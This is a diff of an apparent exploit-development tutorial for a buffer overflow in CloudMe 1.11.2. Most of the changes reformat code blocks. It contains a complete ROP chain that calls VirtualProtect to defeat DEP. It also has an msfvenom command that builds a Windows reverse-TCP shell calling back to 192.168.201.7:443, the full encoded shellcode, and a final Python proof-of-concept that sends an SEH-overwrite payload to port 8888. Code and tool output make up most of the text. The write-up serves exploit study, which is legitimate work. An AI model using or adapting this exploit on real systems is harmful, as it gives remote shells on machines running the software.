@@ -1635,7 +1635,39 @@ python ROPgadget.py --binary "C:\Users\pentest\AppData\Local\Programs\CloudMe\Cl
 The following snippet shows the setup of **VirtualProtect** using ROP gadgets
 
 ```
-# ROP - NOP 0x6d9c23ab # POP EDI # RETN [Qt5Sql.dll] 0x6d9c1011 # RETN [Qt5Sql.dll] # ptr to VirtualProtect 0x61b63b3c # XCHG EAX, ESI # RETN # flNewProtect of 0x40 0x68d327ff # POP EAX # POP ECX # RETN [Qt5Core.dll] 0xffffffc0 # Value to negate, will become 0x00000040 0x41414141 # Filler 0x68cef5b2 # NEG EAX # RETN [Qt5Core.dll] 0x68b1df17 # XCHG EAX,EDX # RETN [Qt5Core.dll] # dwSize of 0x201 0x68ae7ee3 # POP EAX # RETN [Qt5Core.dll] 0xfffffdff # Value to negate, will become 0x00000201 0x6d9e431a # NEG EAX # RETN [Qt5Sql.dll] 0x68aad07c # XCHG EAX,EBX # RETN [Qt5Core.dll] # ReturnAddress 0x6d9c12c9 # POP EBP # RETN [Qt5Sql.dll] 0x6d9c12c9 # skip 4 bytes # flOldProtect 0x6fe4dc57 # POP EAX # POP ECX # RETN 0x90909090 # NOP 0x68ee6b16 # &Writable location [Qt5Core.dll] 0x68ef1b07 # PUSHAD # RETN [Qt5Core.dll] #lpAddress0x64b4d6cd # JMP ESP [libwinpthread-1.dll]
+# ROP - NOP
+0x6d9c23ab # POP EDI # RETN [Qt5Sql.dll]
+0x6d9c1011 # RETN [Qt5Sql.dll]
+
+# ptr to VirtualProtect
+0x61b63b3c # XCHG EAX, ESI # RETN 
+
+# flNewProtect of 0x40
+0x68d327ff # POP EAX # POP ECX # RETN [Qt5Core.dll]
+0xffffffc0 # Value to negate, will become 0x00000040
+0x41414141 # Filler
+0x68cef5b2 # NEG EAX # RETN [Qt5Core.dll]
+0x68b1df17 # XCHG EAX,EDX # RETN [Qt5Core.dll]
+
+# dwSize of 0x201
+0x68ae7ee3 # POP EAX # RETN [Qt5Core.dll]
+0xfffffdff # Value to negate, will become 0x00000201
+0x6d9e431a # NEG EAX # RETN [Qt5Sql.dll]
+0x68aad07c # XCHG EAX,EBX # RETN [Qt5Core.dll]
+
+# ReturnAddress
+0x6d9c12c9 # POP EBP # RETN [Qt5Sql.dll]
+0x6d9c12c9 # skip 4 bytes
+
+# flOldProtect
+0x6fe4dc57 # POP EAX # POP ECX # RETN 
+0x90909090 # NOP 
+0x68ee6b16 # &Writable location [Qt5Core.dll]
+
+0x68ef1b07 # PUSHAD # RETN [Qt5Core.dll]
+
+#lpAddress
+0x64b4d6cd # JMP ESP [libwinpthread-1.dll]
 ```
 
 The first two lines above will align our return after executing. To achieve this we will be filling EDI with a ROP-NOP as filler so the chain would continue working as intended.At line 3 the ESI register will have the address of **VirtualProtect**. At this point we have to remember that the **VirtualProtect** address, before assigned to ESI register,&nbsp; it was assigned to the EAX register, and that happened because of the gadgets we have used before in order to load the address dynamically. At lines 4 - 8 , the memory protection constant **0x40** (read-write privileges) will be put on EAX register and then into EDX in order to setup the **flNewProtect** argument. At lines 9 - 12 , we set up the size of the region whose access protection attributes are to be changed, in bytes. Here we choose to put **0x201** ( 513 bytes ). At lines 13 - 14 we set up the pointer to the location where **VirtualProtect** needs to return to. This will be the address of the shellcode on the stack. At lines 15 - 17 we set a pointer to variable that will receive the previous access protection value. At line 18 we push all general purpose registers on the stack and then at line 19 we jump to our shellcode.
@@ -1649,7 +1681,43 @@ The following reverse TCP shellcode will be used in order to exploit the buffer 
 From msfvenom we generate the reverse TCP shellcode :
 
 ```
-root@kali:~# msfvenom -p windows/shell\_reverse\_tcp LHOST=192.168.201.7 LPORT=443 EXITFUNC=thread -b "\x00" -f python [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload Found 11 compatible encoders Attempting to encode payload with 1 iterations of x86/shikata\_ga\_nai x86/shikata\_ga\_nai succeeded with size 351 (iteration=0) x86/shikata\_ga\_nai chosen with final size 351 Payload size: 351 bytes Final size of python file: 1712 bytes buf = b"" buf += b"\xdb\xdc\xd9\x74\x24\xf4\xb8\x81\xf1\x20\xb2\x5a\x2b" buf += b"\xc9\xb1\x52\x31\x42\x17\x83\xc2\x04\x03\xc3\xe2\xc2" buf += b"\x47\x3f\xec\x81\xa8\xbf\xed\xe5\x21\x5a\xdc\x25\x55" buf += b"\x2f\x4f\x96\x1d\x7d\x7c\x5d\x73\x95\xf7\x13\x5c\x9a" buf += b"\xb0\x9e\xba\x95\x41\xb2\xff\xb4\xc1\xc9\xd3\x16\xfb" buf += b"\x01\x26\x57\x3c\x7f\xcb\x05\x95\x0b\x7e\xb9\x92\x46" buf += b"\x43\x32\xe8\x47\xc3\xa7\xb9\x66\xe2\x76\xb1\x30\x24" buf += b"\x79\x16\x49\x6d\x61\x7b\x74\x27\x1a\x4f\x02\xb6\xca" buf += b"\x81\xeb\x15\x33\x2e\x1e\x67\x74\x89\xc1\x12\x8c\xe9" buf += b"\x7c\x25\x4b\x93\x5a\xa0\x4f\x33\x28\x12\xab\xc5\xfd" buf += b"\xc5\x38\xc9\x4a\x81\x66\xce\x4d\x46\x1d\xea\xc6\x69" buf += b"\xf1\x7a\x9c\x4d\xd5\x27\x46\xef\x4c\x82\x29\x10\x8e" buf += b"\x6d\x95\xb4\xc5\x80\xc2\xc4\x84\xcc\x27\xe5\x36\x0d" buf += b"\x20\x7e\x45\x3f\xef\xd4\xc1\x73\x78\xf3\x16\x73\x53" buf += b"\x43\x88\x8a\x5c\xb4\x81\x48\x08\xe4\xb9\x79\x31\x6f" buf += b"\x39\x85\xe4\x20\x69\x29\x57\x81\xd9\x89\x07\x69\x33" buf += b"\x06\x77\x89\x3c\xcc\x10\x20\xc7\x87\xde\x1d\x0e\x50" buf += b"\xb7\x5f\x90\x5e\xfc\xe9\x76\x0a\x12\xbc\x21\xa3\x8b" buf += b"\xe5\xb9\x52\x53\x30\xc4\x55\xdf\xb7\x39\x1b\x28\xbd" buf += b"\x29\xcc\xd8\x88\x13\x5b\xe6\x26\x3b\x07\x75\xad\xbb" buf += b"\x4e\x66\x7a\xec\x07\x58\x73\x78\xba\xc3\x2d\x9e\x47" buf += b"\x95\x16\x1a\x9c\x66\x98\xa3\x51\xd2\xbe\xb3\xaf\xdb" buf += b"\xfa\xe7\x7f\x8a\x54\x51\xc6\x64\x17\x0b\x90\xdb\xf1" buf += b"\xdb\x65\x10\xc2\x9d\x69\x7d\xb4\x41\xdb\x28\x81\x7e" buf += b"\xd4\xbc\x05\x07\x08\x5d\xe9\xd2\x88\x7d\x08\xf6\xe4" buf += b"\x15\x95\x93\x44\x78\x26\x4e\x8a\x85\xa5\x7a\x73\x72" buf += b"\xb5\x0f\x76\x3e\x71\xfc\x0a\x2f\x14\x02\xb8\x50\x3d"
+root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.201.7 LPORT=443 EXITFUNC=thread  -b "\x00" -f  python
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 351 (iteration=0)
+x86/shikata_ga_nai chosen with final size 351
+Payload size: 351 bytes
+Final size of python file: 1712 bytes
+buf =  b""
+buf += b"\xdb\xdc\xd9\x74\x24\xf4\xb8\x81\xf1\x20\xb2\x5a\x2b"
+buf += b"\xc9\xb1\x52\x31\x42\x17\x83\xc2\x04\x03\xc3\xe2\xc2"
+buf += b"\x47\x3f\xec\x81\xa8\xbf\xed\xe5\x21\x5a\xdc\x25\x55"
+buf += b"\x2f\x4f\x96\x1d\x7d\x7c\x5d\x73\x95\xf7\x13\x5c\x9a"
+buf += b"\xb0\x9e\xba\x95\x41\xb2\xff\xb4\xc1\xc9\xd3\x16\xfb"
+buf += b"\x01\x26\x57\x3c\x7f\xcb\x05\x95\x0b\x7e\xb9\x92\x46"
+buf += b"\x43\x32\xe8\x47\xc3\xa7\xb9\x66\xe2\x76\xb1\x30\x24"
+buf += b"\x79\x16\x49\x6d\x61\x7b\x74\x27\x1a\x4f\x02\xb6\xca"
+buf += b"\x81\xeb\x15\x33\x2e\x1e\x67\x74\x89\xc1\x12\x8c\xe9"
+buf += b"\x7c\x25\x4b\x93\x5a\xa0\x4f\x33\x28\x12\xab\xc5\xfd"
+buf += b"\xc5\x38\xc9\x4a\x81\x66\xce\x4d\x46\x1d\xea\xc6\x69"
+buf += b"\xf1\x7a\x9c\x4d\xd5\x27\x46\xef\x4c\x82\x29\x10\x8e"
+buf += b"\x6d\x95\xb4\xc5\x80\xc2\xc4\x84\xcc\x27\xe5\x36\x0d"
+buf += b"\x20\x7e\x45\x3f\xef\xd4\xc1\x73\x78\xf3\x16\x73\x53"
+buf += b"\x43\x88\x8a\x5c\xb4\x81\x48\x08\xe4\xb9\x79\x31\x6f"
+buf += b"\x39\x85\xe4\x20\x69\x29\x57\x81\xd9\x89\x07\x69\x33"
+buf += b"\x06\x77\x89\x3c\xcc\x10\x20\xc7\x87\xde\x1d\x0e\x50"
+buf += b"\xb7\x5f\x90\x5e\xfc\xe9\x76\x0a\x12\xbc\x21\xa3\x8b"
+buf += b"\xe5\xb9\x52\x53\x30\xc4\x55\xdf\xb7\x39\x1b\x28\xbd"
+buf += b"\x29\xcc\xd8\x88\x13\x5b\xe6\x26\x3b\x07\x75\xad\xbb"
+buf += b"\x4e\x66\x7a\xec\x07\x58\x73\x78\xba\xc3\x2d\x9e\x47"
+buf += b"\x95\x16\x1a\x9c\x66\x98\xa3\x51\xd2\xbe\xb3\xaf\xdb"
+buf += b"\xfa\xe7\x7f\x8a\x54\x51\xc6\x64\x17\x0b\x90\xdb\xf1"
+buf += b"\xdb\x65\x10\xc2\x9d\x69\x7d\xb4\x41\xdb\x28\x81\x7e"
+buf += b"\xd4\xbc\x05\x07\x08\x5d\xe9\xd2\x88\x7d\x08\xf6\xe4"
+buf += b"\x15\x95\x93\x44\x78\x26\x4e\x8a\x85\xa5\x7a\x73\x72"
+buf += b"\xb5\x0f\x76\x3e\x71\xfc\x0a\x2f\x14\x02\xb8\x50\x3d"
 ```
 
 Now lets finalize our PoC exploit script and see the registers pushed into the stack using **windbg** debugger. The final exploit will be as follows :
@@ -1659,15 +1727,16 @@ Now lets finalize our PoC exploit script and see the registers pushed into the s
 # Date: 2020-05-20
 # Exploit Author: Xenofon Vassilakopoulos
 # Vendor Homepage: https://www.cloudme.com/en
-# Software Link: https://www.cloudme.com/downloads/CloudMe\_1112.exe
+# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
 # Version: CloudMe 1.11.2
 # Tested on: Windows 7 Professional x86 SP1
 
 # Steps to reproduce:
 # 1. On your local machine start the CloudMe service.
 # 2. change the reverse tcp shellcode using the IP and Port of your host using the following command
-# msfvenom -p windows/shell\_reverse\_tcp LHOST=\<IP\> LPORT=\<port\> EXITFUNC=thread -b "\x00\x0d\x0a" -f python
+# msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<port> EXITFUNC=thread -b "\x00\x0d\x0a" -f python
 # 3. Run the python script.
+
 
 import struct
 import socket
@@ -1732,7 +1801,7 @@ rop+= struct.pack('L',0x68ef1b07) # PUSHAD # RETN [Qt5Core.dll]
 
 rop+= struct.pack('L',0x64b4d6cd) # JMP ESP [libwinpthread-1.dll]
 
-#msfvenom -p windows/shell\_reverse\_tcp LHOST=192.168.201.7 LPORT=443 EXITFUNC=thread -b "\x00" -f pythonLPORT=443 EXITFUNC=thread -b "\x00\x0d\x0a" -f python
+#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.201.7 LPORT=443 EXITFUNC=thread -b "\x00" -f pythonLPORT=443 EXITFUNC=thread -b "\x00\x0d\x0a" -f python
 buf = b""
 buf += b"\xdb\xdc\xd9\x74\x24\xf4\xb8\x81\xf1\x20\xb2\x5a\x2b"
 buf += b"\xc9\xb1\x52\x31\x42\x17\x83\xc2\x04\x03\xc3\xe2\xc2"
@@ -1764,22 +1833,22 @@ buf += b"\xb5\x0f\x76\x3e\x71\xfc\x0a\x2f\x14\x02\xb8\x50\x3d"
 
 ##########
 
-junk1 = "\x41"\*1604
+junk1 = "\x41"*1604
 
-nops = "\x90"\*16
+nops = "\x90"*16
 
-junk2 = "C"\*(2236 - len(nops) - len(buf) - len(rop) - len(junk1))
+junk2 = "C"*(2236 - len(nops) - len(buf) - len(rop) - len(junk1))
 
 seh = struct.pack('L',0x6998fb2e) # ADD ESP,76C # POP EBX # POP ESI # POP EDI # POP EBP # RETN [Qt5Network.dll]
 
 payload = junk1 + rop + nops + buf + junk2 + seh
 
 try:
- s=socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)
- s.connect((target,8888))
- s.send(payload)
+   s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+   s.connect((target,8888))
+   s.send(payload)
 except Exception as e:
- print(sys.exc\_value)
+   print(sys.exc_value)
 ```
 
 Now, after running the exploit, we can see step by step in the debugger the values of the registers
